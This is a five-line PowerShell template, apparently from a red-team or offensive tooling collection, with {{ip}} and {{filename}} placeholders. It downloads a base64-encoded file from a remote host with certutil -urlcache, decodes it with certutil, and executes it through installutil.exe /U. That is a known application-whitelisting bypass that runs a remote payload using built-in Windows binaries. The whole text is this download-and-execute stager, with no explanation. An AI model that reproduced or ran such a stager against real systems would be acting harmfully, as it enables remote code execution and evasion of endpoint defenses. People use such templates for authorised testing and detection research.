$b64file = New-TemporaryFile;
$decodedfile = New-TemporaryFile;
&"C:\windows\system32\certutil.exe" -urlcache -f http://{{ip}}/{{filename}} $b64file;
&"C:\windows\system32\certutil.exe" -decode $b64file $decodedfile;
&"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe" /logfile= /LogToConsole=true /U $decodedfile;